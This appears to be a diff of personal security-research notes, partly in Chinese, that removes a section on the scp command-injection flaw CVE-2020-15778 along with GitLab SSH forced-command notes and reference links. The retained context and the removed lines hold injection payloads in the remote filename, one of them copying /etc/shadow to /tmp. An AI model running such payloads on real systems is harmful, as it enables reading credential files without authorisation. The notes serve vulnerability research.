@@ -392,40 +392,6 @@ https://securitytrails.com/
 [Write up for CVE id CVE-2020-15778.](https://github.com/cpandya2909/CVE-2020-15778/)
 scp  /sourcefile remoteserver:'`touch /tmp/exploit.sh`/targetfile'
 
-+ 使用root来执行还是scp用户: 是scp用户
-
-```bash
-scp ./abc ubuntus:'`cat /etc/shadow > /tmp/ccc`/tmp/abc'
-```
-
-+ gitlab的git是否会受到影响，现在看，没有
-+ 0权限的是否能运行，不能
-
-[blog](http://octopress.org/)
-[disqus](https://disqus.com/)
-
-构造： scp ./abc ubuntus:'`cat /etc/shadow > /tmp/ccc`/tmp/abc'
-
-gitlab:
-
-```bash
-/var/opt/gitlab/.ssh/authorized_keys
-command="/opt/gitlab/embedded/service/gitlab-shell/bin/gitlab-shell key-711",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa AAAAxxxx
-```
-
-command
-no-port-forwarding
-no-X11-forwarding
-no-agent-forwarding
-no-pty
-
-[GitLab系列4 GitLab Shell|**这个很不错**](https://juejin.im/post/6844903860033552391)
-
-[Gitlab Shell如何工作](http://williamherry.com/blog/2015/07/19/from-git-push-to-commit-show-on-page/)
-
-[Fast lookup of authorized SSH keys in the database](https://docs.gitlab.com/ee/administration/operations/fast_ssh_key_lookup.html)
-
-[诡异的gitlab排错经历](https://xnow.me/ops/gitlab-authorized_keys-trouble-shooting.html)
 
 
 [Linux下只允许用户远程scp](https://my.oschina.net/firxiao/blog/378499) 
